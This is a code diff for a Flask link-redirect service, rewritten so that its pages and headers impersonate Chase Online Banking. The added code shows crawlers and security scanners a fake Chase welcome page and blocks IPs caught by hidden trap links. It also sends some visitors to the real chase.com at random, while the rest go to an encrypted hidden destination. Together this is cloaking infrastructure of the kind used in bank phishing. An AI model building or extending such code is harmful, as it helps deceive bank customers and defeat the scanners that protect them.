-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                            <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
-                            <p class="text-gray-600">Invalid redirect URL.</p>
-                        </div>
-                    </body>
-                    </html>
-                """, request=request), 400)
-                return add_security_headers(response)
-            if time.time() > expiry:
-                logger.warning("URL expired")
-                if valkey_client:
-                    valkey_client.delete(f"url_payload:{url_id}")
-                response = make_response(render_template_string("""
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <meta name="robots" content="noindex, nofollow">
-                        <meta name="description" content="Secure URL redirection service for managing custom links">
-                        <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                        <meta name="author" content="TamariskSD">
-                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                        <meta name="referrer" content="strict-origin-when-cross-origin">
-                        <meta property="og:title" content="TamariskSD - Link Expired">
-                        <meta property="og:description" content="The requested link has expired">
-                        <meta property="og:type" content="website">
-                        <meta property="og:url" content="{{ request.url }}">
-                        <title>Link Expired - TamariskSD</title>
-                        <script src="https://cdn.tailwindcss.com"></script>
-                    </head>
-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                            <h3 class="text-lg font-bold mb-4 text-red-600">Link Expired</h3>
-                            <p class="text-gray-600">The link has expired. Please contact support.</p>
-                        </div>
-                    </body>
-                    </html>
-                """, request=request), 410)
-                return add_security_headers(response)
-        except json.JSONDecodeError as e:
-            logger.error(f"Payload parsing error: {str(e)}")
-            response = make_response(render_template_string("""
+            return redirect(url_for('dashboard'))
+        else:
+            logger.warning("Valkey unavailable, cannot delete URL")
+            return render_template_string("""
                 <!DOCTYPE html>
                 <html lang="en">
                 <head>
                     <meta charset="UTF-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <meta name="robots" content="noindex, nofollow">
-                    <meta name="description" content="Secure URL redirection service for managing custom links">
-                    <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                    <meta name="author" content="TamariskSD">
-                    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                    <meta name="referrer" content="strict-origin-when-cross-origin">
-                    <meta property="og:title" content="TamariskSD - Invalid Link">
-                    <meta property="og:description" content="The provided link is invalid or malformed">
-                    <meta property="og:type" content="website">
-                    <meta property="og:url" content="{{ request.url }}">
-                    <title>Invalid Link - TamariskSD</title>
+                    <title>Error</title>
                     <script src="https://cdn.tailwindcss.com"></script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                     <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
-                        <p class="text-gray-600">Invalid payload.</p>
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
+                        <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
+                        <a href="/bot-trap" style="display:none;">Bot Trap</a>
                     </div>
                 </body>
                 </html>
-            """, request=request), 400)
-            return add_security_headers(response)
-
-        # Increment analytics
-        if should_count_click and valkey_client:
-            valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
-            logger.debug(f"Incremented click count for URL {url_id}")
-
-        # Set cookie for first request
-        response = make_response(redirect(f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}", code=302))
-        if is_first_request:
-            response.set_cookie('bot_check_token', cookie_token, max_age=COOKIE_TOKEN_TTL, secure=True, httponly=True, samesite='Strict')
-        logger.info(f"Redirecting to {redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}")
-        return add_security_headers(response)
+            """), 500
     except Exception as e:
-        logger.error(f"Error in verify: {str(e)}")
-        response = make_response(redirect("https://google.com", code=302))
-        return add_security_headers(response)
+        logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+            status=500,
+            headers=headers
+        )
 
-@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
-@dynamic_rate_limit(base_limit=5, base_per=60)
-def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
+@app.route("/link/<path:path_segment>", methods=["GET"], subdomain="<username>")
+@rate_limit(limit=5, per=60)
+def redirect_handler(username, path_segment):
     try:
-        host = request.host
-        username = host.split('.')[0] if '.' in host else "default"
-        logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}")
-        response = make_response(redirect_handler(username, endpoint, encrypted_payload, path_segment))
-        return add_security_headers(response)
-    except Exception as e:
-        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}")
-        response = make_response(redirect("https://google.com", code=302))
-        return add_security_headers(response)
+        base_domain = get_base_domain()
+        logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, "
+                     f"path_segment={path_segment}, query={request.query_string.decode()}, IP={request.remote_addr}, URL={request.url}")
 
-@app.route("/favicon.ico")
-def favicon():
-    response = make_response('', 204)
-    return add_security_headers(response)
+        # Check if IP is blocked due to bot trap
+        if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
+            logger.warning(f"Blocked IP {request.remote_addr} accessed redirect handler")
+            headers = mimic_chase_response()
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=403,
+                headers=headers
+            )
+
+        # Scanner detection
+        headers = mimic_chase_response()
+        if 'User-Agent' in request.headers and any(keyword in request.headers['User-Agent'].lower() for keyword in ['bot', 'crawler', 'scanner', 'spider']):
+            logger.debug("Detected scanner, returning Chase.com-like response")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Welcome to Chase Online Banking</body></html>",
+                status=200,
+                headers=headers
+            )
+
+        # Behavioral analysis
+        if not check_behavior(request.remote_addr):
+            logger.warning(f"Behavioral check failed for IP {request.remote_addr}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=403,
+                headers=headers
+            )
+
+        # Parse query parameters
+        url_id = request.args.get('id')
+        timestamp = request.args.get('ts')
+        encoded_payload = request.args.get('url')
+        logger.debug(f"Parsed query parameters: id={url_id}, ts={timestamp}, url={encoded_payload}")
+
+        if not (url_id and timestamp and encoded_payload):
+            logger.error(f"Missing query parameters: id={url_id}, ts={timestamp}, url={encoded_payload}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        # Extract randomstrings from path
+        if not path_segment:
+            logger.error(f"Empty path_segment: {path_segment}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+        randomstrings = path_segment
+        randomstring1 = randomstrings[:len(randomstrings)//2]
+        randomstring2 = randomstrings[len(randomstrings)//2:]
+        logger.debug(f"Parsed path: randomstring1={randomstring1}, randomstring2={randomstring2}")
+
+        # Randomized delay (optimized for speed)
+        delay = random.uniform(0.1, 0.2)
+        time.sleep(delay)
+        logger.debug(f"Applied random delay of {delay:.3f} seconds")
+
+        # Decode payload
+        try:
+            encrypted_payload = base64.urlsafe_b64decode(encoded_payload).decode('utf-8')
+            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
+        except Exception as e:
+            logger.error(f"Error decoding base64 payload: {str(e)}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link encoding<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        # Generate url_id_hash
+        url_id_hash = hashlib.sha256(f"{url_id}{encrypted_payload}".encode()).hexdigest()
+        logger.debug(f"Generated url_id_hash: {url_id_hash}")
+
+        payload = None
+        if valkey_client:
+            try:
+                cached_payload = valkey_client.get(f"url_payload:{url_id_hash}")
+                if cached_payload:
+                    payload = cached_payload
+                    logger.debug(f"Using cached payload for URL ID: {url_id_hash}")
+            except Exception as e:
+                logger.error(f"Valkey error checking cached payload: {str(e)}")
+
+        if not payload:
+            if valkey_client:
+                try:
+                    url_data = valkey_client.hgetall(f"user:{username}:url:{url_id_hash}")
+                    encryption_method = url_data.get('encryption_method', 'aes_gcm')
+                    key_version = url_data.get('key_version', KEY_VERSION)
+                    logger.debug(f"Retrieved from Valkey: encryption_method={encryption_method}, key_version={key_version}")
+                except Exception as e:
+                    logger.error(f"Valkey error retrieving encryption method: {str(e)}")
+                    encryption_method = 'aes_gcm'
+                    key_version = KEY_VERSION
+            else:
+                encryption_method = 'aes_gcm'
+                key_version = KEY_VERSION
+                logger.warning("Valkey unavailable, using default encryption_method and key_version")
+
+            methods = [encryption_method] if encryption_method else ['aes_gcm', 'hmac_sha256']
+            key_pairs = [(AES_GCM_KEY, HMAC_KEY)]
+            if key_version != KEY_VERSION and PREVIOUS_AES_GCM_KEY and PREVIOUS_HMAC_KEY:
+                key_pairs.append((PREVIOUS_AES_GCM_KEY, PREVIOUS_HMAC_KEY))
+
+            for method in methods:
+                for aes_key, hmac_key in key_pairs:
+                    try:
+                        logger.debug(f"Trying decryption method: {method} with key version: {key_version}")
+                        if method == 'aes_gcm':
+                            payload = decrypt_aes_gcm(encrypted_payload, key=aes_key)
+                        else:
+                            payload = decrypt_hmac_sha256(encrypted_payload, key=hmac_key)
+                        logger.debug(f"Decryption successful with {method}")
+                        if valkey_client:
+                            try:
+                                expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
+                                ttl = max(1, int(expiry - time.time()))
+                                valkey_client.setex(f"url_payload:{url_id_hash}", ttl, payload)
+                                logger.debug(f"Cached payload for URL ID: {url_id_hash} with TTL {ttl}s")
+                            except Exception as e:
+                                logger.error(f"Valkey error caching payload: {str(e)}")
+                        break
+                    except ValueError as e:
+                        logger.debug(f"Decryption failed with {method} and key version {key_version}: {str(e)}")
+                        # Fallback: Check if payload is unencrypted JSON
+                        try:
+                            json.loads(encrypted_payload)
+                            logger.warning(f"Detected unencrypted payload: {encrypted_payload[:50]}...")
+                            payload = encrypted_payload
+                            break
+                        except json.JSONDecodeError:
+                            continue
+                if payload:
+                    break
+
+        if not payload:
+            logger.error(f"All decryption methods failed for payload: {encrypted_payload[:50]}...")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid or corrupted link<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        try:
+            data = json.loads(payload)
+            redirect_url = data.get("student_link")
+            expiry = data.get("expiry", float('inf'))
+            logger.debug(f"Parsed payload: redirect_url={redirect_url}, expiry={expiry}")
+            if not redirect_url or not re.match(r"^https?://", redirect_url):
+                logger.error(f"Invalid redirect URL: {redirect_url}")
+                return Response(
+                    "<html><head><title>Chase Online</title></head><body>Invalid destination URL<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                    status=400,
+                    headers=headers
+                )
+            if time.time() > expiry:
+                logger.warning("URL expired")
+                if valkey_client:
+                    valkey_client.delete(f"url_payload:{url_id_hash}")
+                return Response(
+                    "<html><head><title>Chase Online</title></head><body>Link expired<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                    status=410,
+                    headers=headers
+                )
+        except Exception as e:
+            logger.error(f"Payload parsing error: {str(e)}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link data<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        # Fake redirect for polymorphism
+        if random.random() < 0.3:  # 30% chance
+            logger.debug("Performing fake redirect to chase.com")
+            return redirect("https://www.chase.com", code=302, Response=Response(headers=headers))
+
+        final_url = redirect_url.rstrip('/')
+        logger.info(f"Redirecting to {final_url}")
+        if valkey_client:
+            try:
+                analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id_hash}", "analytics_enabled") == "1"
+                if analytics_enabled:
+                    valkey_client.hincrby(f"user:{username}:url:{url_id_hash}", "clicks", 1)
+                    logger.debug(f"Incremented clicks for URL ID: {url_id_hash}")
+            except Exception as e:
+                logger.error(f"Valkey error logging click: {str(e)}")
+        return redirect(final_url, code=302, Response=Response(headers=headers))
+    except Exception as e:
+        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+            status=500,
+            headers=headers
+        )
+
+@app.route("/<endpoint>/<path:path_segment>", methods=["GET"], subdomain="<username>")
+@rate_limit(limit=5, per=60)
+def redirect_handler_old(username, endpoint, path_segment):
+    try:
+        base_domain = get_base_domain()
+        logger.debug(f"Old redirect handler called: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
+                     f"path_segment={path_segment}, IP={request.remote_addr}, URL={request.url}")
+
+        # Check if IP is blocked due to bot trap
+        if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
+            logger.warning(f"Blocked IP {request.remote_addr} accessed old redirect handler")
+            headers = mimic_chase_response()
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=403,
+                headers=headers
+            )
+
+        # Scanner detection
+        headers = mimic_chase_response()
+        if 'User-Agent' in request.headers and any(keyword in request.headers['User-Agent'].lower() for keyword in ['bot', 'crawler', 'scanner', 'spider']):
+            logger.debug("Detected scanner, returning Chase.com-like response")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Welcome to Chase Online Banking</body></html>",
+                status=200,
+                headers=headers
+            )
+
+        # Behavioral analysis
+        if not check_behavior(request.remote_addr):
+            logger.warning(f"Behavioral check failed for IP {request.remote_addr}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=403,
+                headers=headers
+            )
+
+        # Split path_segment to extract random_path and randomstrings
+        path_parts = path_segment.rsplit('/', 1)
+        if len(path_parts) != 2:
+            logger.error(f"Invalid path_segment format: {path_segment}, expected <random_path>/<randomstring1randomstring2>")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+        random_path, randomstrings = path_parts
+        if not randomstrings:
+            logger.error(f"Empty randomstrings in path_segment: {path_segment}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+        randomstring1 = randomstrings[:len(randomstrings)//2]
+        randomstring2 = randomstrings[len(randomstrings)//2:]
+        logger.debug(f"Parsed path: random_path={random_path[:20]}..., randomstring1={randomstring1}, randomstring2={randomstring2}")
+
+        # Randomized delay (optimized for speed)
+        delay = random.uniform(0.1, 0.2)
+        time.sleep(delay)
+        logger.debug(f"Applied random delay of {delay:.3f} seconds")
+
+        # Extract payload dynamically
+        url_id = None
+        encrypted_payload = None
+        payload_length = 0
+        if valkey_client:
+            try:
+                url_id = hashlib.sha256(f"{endpoint}{random_path}".encode()).hexdigest()
+                url_data = valkey_client.hgetall(f"user:{username}:url:{url_id}")
+                if url_data and 'encrypted_payload' in url_data:
+                    encrypted_payload = url_data['encrypted_payload']
+                    payload_length = len(encrypted_payload)
+                    logger.debug(f"Retrieved encrypted_payload from Valkey: {encrypted_payload[:20]}... (length: {payload_length})")
+                else:
+                    logger.warning(f"No URL data found for url_id: {url_id}")
+                    encrypted_payload = random_path
+                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+            except Exception as e:
+                logger.error(f"Valkey error retrieving URL data: {str(e)}")
+                encrypted_payload = random_path
+                url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+
+        if not encrypted_payload:
+            logger.error(f"No encrypted payload extracted from random_path: {random_path}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        try:
+            encrypted_payload = urllib.parse.unquote(encrypted_payload)
+            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
+        except Exception as e:
+            logger.error(f"Error decoding encrypted_payload: {str(e)}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link encoding<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        payload = None
+        if valkey_client:
+            try:
+                cached_payload = valkey_client.get(f"url_payload:{url_id}")
+                if cached_payload:
+                    payload = cached_payload
+                    logger.debug(f"Using cached payload for URL ID: {url_id}")
+            except Exception as e:
+                logger.error(f"Valkey error checking cached payload: {str(e)}")
+
+        if not payload:
+            if valkey_client:
+                try:
+                    url_data = valkey_client.hgetall(f"user:{username}:url:{url_id}")
+                    encryption_method = url_data.get('encryption_method', 'aes_gcm')
+                    key_version = url_data.get('key_version', KEY_VERSION)
+                    logger.debug(f"Retrieved from Valkey: encryption_method={encryption_method}, key_version={key_version}")
+                except Exception as e:
+                    logger.error(f"Valkey error retrieving encryption method: {str(e)}")
+                    encryption_method = 'aes_gcm'
+                    key_version = KEY_VERSION
+            else:
+                encryption_method = 'aes_gcm'
+                key_version = KEY_VERSION
+                logger.warning("Valkey unavailable, using default encryption_method and key_version")
+
+            methods = [encryption_method] if encryption_method else ['aes_gcm', 'hmac_sha256']
+            key_pairs = [(AES_GCM_KEY, HMAC_KEY)]
+            if key_version != KEY_VERSION and PREVIOUS_AES_GCM_KEY and PREVIOUS_HMAC_KEY:
+                key_pairs.append((PREVIOUS_AES_GCM_KEY, PREVIOUS_HMAC_KEY))
+
+            for method in methods:
+                for aes_key, hmac_key in key_pairs:
+                    try:
+                        logger.debug(f"Trying decryption method: {method} with key version: {key_version}")
+                        if method == 'aes_gcm':
+                            payload = decrypt_aes_gcm(encrypted_payload, key=aes_key)
+                        else:
+                            payload = decrypt_hmac_sha256(encrypted_payload, key=hmac_key)
+                        logger.debug(f"Decryption successful with {method}")
+                        if valkey_client:
+                            try:
+                                expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
+                                ttl = max(1, int(expiry - time.time()))
+                                valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
+                                logger.debug(f"Cached payload for URL ID: {url_id} with TTL {ttl}s")
+                            except Exception as e:
+                                logger.error(f"Valkey error caching payload: {str(e)}")
+                        break
+                    except ValueError as e:
+                        logger.debug(f"Decryption failed with {method} and key version {key_version}: {str(e)}")
+                        # Fallback: Check if payload is unencrypted JSON
+                        try:
+                            json.loads(encrypted_payload)
+                            logger.warning(f"Detected unencrypted payload: {encrypted_payload[:50]}...")
+                            payload = encrypted_payload
+                            break
+                        except json.JSONDecodeError:
+                            continue
+                if payload:
+                    break
+
+        if not payload:
+            logger.error(f"All decryption methods failed for payload: {encrypted_payload[:50]}...")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid or corrupted link<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        try:
+            data = json.loads(payload)
+            redirect_url = data.get("student_link")
+            expiry = data.get("expiry", float('inf'))
+            logger.debug(f"Parsed payload: redirect_url={redirect_url}, expiry={expiry}")
+            if not redirect_url or not re.match(r"^https?://", redirect_url):
+                logger.error(f"Invalid redirect URL: {redirect_url}")
+                return Response(
+                    "<html><head><title>Chase Online</title></head><body>Invalid destination URL<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                    status=400,
+                    headers=headers
+                )
+            if time.time() > expiry:
+                logger.warning("URL expired")
+                if valkey_client:
+                    valkey_client.delete(f"url_payload:{url_id}")
+                return Response(
+                    "<html><head><title>Chase Online</title></head><body>Link expired<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                    status=410,
+                    headers=headers
+                )
+        except Exception as e:
+            logger.error(f"Payload parsing error: {str(e)}")
+            return Response(
+                "<html><head><title>Chase Online</title></head><body>Invalid link data<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+                status=400,
+                headers=headers
+            )
+
+        # Fake redirect for polymorphism
+        if random.random() < 0.3:  # 30% chance
+            logger.debug("Performing fake redirect to chase.com")
+            return redirect("https://www.chase.com", code=302, Response=Response(headers=headers))
+
+        final_url = redirect_url.rstrip('/')
+        logger.info(f"Redirecting to {final_url}")
+        if valkey_client:
+            try:
+                analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
+                if analytics_enabled:
+                    valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
+                    logger.debug(f"Incremented clicks for URL ID: {url_id}")
+            except Exception as e:
+                logger.error(f"Valkey error logging click: {str(e)}")
+        return redirect(final_url, code=302, Response=Response(headers=headers))
+    except Exception as e:
+        logger.error(f"Error in redirect_handler_old: {str(e)}", exc_info=True)
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+            status=500,
+            headers=headers
+        )
 
 @app.route("/<path:path>", methods=["GET"])
 def catch_all(path):
-    logger.warning(f"404 Not Found for path: {path}, host: {request.host}")
-    response = make_response(render_template_string("""
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <meta name="robots" content="noindex, nofollow">
-            <meta name="description" content="Secure URL redirection service for managing custom links">
-            <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-            <meta name="author" content="TamariskSD">
-            <meta http-equiv="X-UA-Compatible" content="IE=edge">
-            <meta name="referrer" content="strict-origin-when-cross-origin">
-            <meta property="og:title" content="TamariskSD - Not Found">
-            <meta property="og:description" content="The requested URL was not found on the server">
-            <meta property="og:type" content="website">
-            <meta property="og:url" content="{{ request.url }}">
-            <title>Not Found - TamariskSD</title>
-            <script src="https://cdn.tailwindcss.com"></script>
-        </head>
-        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
-                <p class="text-gray-600">The requested URL was not found on the server.</p>
-                <p class="text-gray-600">Please check your spelling and try again.</p>
-            </div>
-        </body>
-        </html>
-    """, request=request), 404)
-    return add_security_headers(response)
+    logger.error(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}, query: {request.query_string.decode()}")
+    headers = mimic_chase_response()
+    return Response(
+        "<html><head><title>Chase Online</title></head><body>Page Not Found<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+        status=404,
+        headers=headers
+    )
 
 if __name__ == "__main__":
     try:
         app.run(host="0.0.0.0", port=5000, debug=False)
     except Exception as e:
-        logger.error(f"Error starting Flask app: {str(e)}")
+        logger.error(f"Error starting Flask app: {str(e)}", exc_info=True)
+        import sys
         sys.exit(1)
